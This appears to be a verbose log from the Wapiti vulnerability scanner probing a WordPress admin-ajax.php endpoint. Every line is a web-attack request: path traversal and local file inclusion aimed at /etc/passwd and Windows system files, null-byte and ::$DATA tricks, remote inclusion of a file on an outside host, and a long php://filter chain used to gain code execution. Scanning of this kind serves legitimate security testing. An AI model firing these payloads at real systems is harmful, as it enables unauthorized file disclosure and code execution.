2024-03-21 21:13:19.822 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:20.593 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:21.370 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:22.142 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:22.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:23.690 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=admin-ajax.php&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:24.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=admin-ajax.php%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:25.237 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=admin-ajax.php%3A%3A%24DATA&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:26.013 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-21 21:13:26.776 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-21 21:13:27.584 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%2Fetc%2Fpasswd (0)
2024-03-21 21:13:28.386 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:13:29.197 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%2Fetc%2Fservices (0)
2024-03-21 21:13:30.009 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:30.775 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 21:13:31.570 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-21 21:13:32.382 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-21 21:13:33.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:13:34.008 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:34.816 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-21 21:13:35.634 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-21 21:13:36.451 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-21 21:13:37.266 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:13:38.081 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:13:38.892 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:13:39.702 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:13:40.515 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:13:41.328 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:13:42.143 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:42.961 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:43.773 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:13:44.579 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:13:45.395 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:46.208 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:47.018 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-21 21:13:47.829 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:13:48.643 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:13:49.456 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:13:50.272 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:13:51.086 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:13:51.898 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:13:52.710 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:53.523 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:54.332 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:13:55.143 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:13:55.958 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:56.766 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:13:57.555 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:13:58.371 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:13:59.185 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:13:59.999 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:14:00.768 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:14:01.579 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:14:02.342 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:14:03.154 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:14:03.961 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:14:04.770 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:14:05.565 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:14:06.378 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:14:07.142 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-21 21:14:07.942 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 21:14:08.705 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-21 21:14:09.516 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:14:10.330 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-21 21:14:11.145 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-21 21:14:11.910 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:14:12.722 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:14:13.485 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=admin-ajax.php (0)
2024-03-21 21:14:14.298 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=admin-ajax.php%00 (0)
2024-03-21 21:14:15.111 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=admin-ajax.php%3A%3A%24DATA (0)
2024-03-21 21:14:15.953 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 21:14:15.964 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
